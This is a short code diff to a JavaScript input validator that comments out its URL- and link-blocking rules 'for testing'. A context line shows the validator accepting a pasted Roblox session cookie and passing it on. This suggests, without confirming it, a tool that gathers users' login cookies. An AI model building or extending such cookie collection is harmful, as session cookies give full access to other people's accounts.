@@ -96,20 +96,20 @@ function isValidCode(code) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // SECOND: Block only very obvious standalone URLs (minimal blocking)
+    // URL blocking temporarily disabled for testing
+    /*
     const urlPatterns = [
-        // Only block very obvious standalone links
-        /^https?:\/\/[^\s]+$/i,     // Full URLs that are the entire input
-        /^www\.[^\s]+$/i,           // www.something as entire input
-        /^discord\.gg\/[^\s]+$/i,   // discord.gg links as entire input
+        /^https?:\/\/[^\s]+$/i,
+        /^www\.[^\s]+$/i,
+        /^discord\.gg\/[^\s]+$/i,
     ];
 
-    // Check both original and preprocessed text for URL patterns
     for (const pattern of urlPatterns) {
         if (pattern.test(cleanCode) || pattern.test(preprocessed)) {
             return { valid: false, reason: 'Links and URLs are not allowed!', isLink: true };
         }
     }
+    */
 
     // THIRD: Check for basic spam patterns
     const spamPatterns = [
